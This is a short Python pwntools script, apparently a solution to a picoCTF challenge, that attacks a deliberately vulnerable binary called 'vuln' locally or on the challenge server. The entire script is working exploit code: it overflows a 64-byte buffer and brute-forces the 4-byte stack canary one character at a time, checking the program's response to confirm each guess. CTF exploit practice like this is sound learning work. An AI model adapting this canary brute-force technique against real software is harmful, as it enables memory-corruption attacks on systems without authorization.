from pwn import *
import sys
import string


canary_offset = 64
canary_size = 4

canary = b""

chall = ELF("./vuln")


def get_process():
        if args.REMOTE:
                r = remote('saturn.picoctf.net', 54612)
                return r
        else:
                return chall.process()


for i in range(1,5):

        for canary_char in string.printable:

                r = get_process()

                r.sendlineafter(b"> ", b"%d" % (canary_offset + i))


                payload = b"A"* canary_offset + canary
                payload += canary_char.encode()


                r.sendlineafter(b"> ", payload)

                resp = r.recvall()

                print (resp)

                if b"Now Where's the Flag" in resp:
                        canary += canary_char.encode()
                        break
                r.close()

print (canary)